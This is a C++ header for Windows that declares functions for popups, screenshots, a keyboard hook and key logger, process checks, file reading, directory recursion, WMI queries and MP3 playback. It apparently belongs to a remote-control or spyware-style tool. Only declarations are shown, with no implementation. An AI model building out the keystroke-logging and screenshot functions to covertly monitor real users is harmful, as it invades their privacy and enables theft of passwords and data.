#pragma once
#include <filesystem>
#include <string>
#include <Windows.h>
#include <vector>
#include <ResourceBinaryView.h>

#include "AutoHandle.h"
#include "FileInfo.h"
#include "Utils/JSON.h"

static constexpr size_t SLEEP_BETWEEN_POPUPS_MILLIS = 100;
static std::vector<DWORD> g_key_logger_key_codes;

namespace windows
{
bool do_popup(const std::string& window_name, const std::string& text, DWORD flags);

void do_popups(size_t count, const std::string& window_name, const std::string& text, DWORD flags);

std::string take_screenshot();

BOOL get_message_with_timeout(MSG* msg, unsigned int timeout);

std::string log_keys(unsigned int duration_seconds);

LRESULT CALLBACK log_keys_hook(int n_code, WPARAM w_param, LPARAM l_param);

bool is_process_running(const std::string& name);

std::string read_file(const std::filesystem::path& path);

ResourceBinaryView get_binary_resource(DWORD resource_id);

std::string get_textual_resource(DWORD resource_id);

bool exists_event(const std::string_view& event_name);

std::unique_ptr<AutoHandle> create_event(const std::string_view& event_name, bool manual_reset);

void signal_event(HANDLE h_event);

json query_wmi(const std::wstring& wmi_class, const std::vector<std::wstring>& properties);

std::vector<std::unique_ptr<FileInfo>> recurse_dir(const std::filesystem::path& path, unsigned int depth);

void play_mp3_from_buffer(const std::string& mp3_buffer);
}
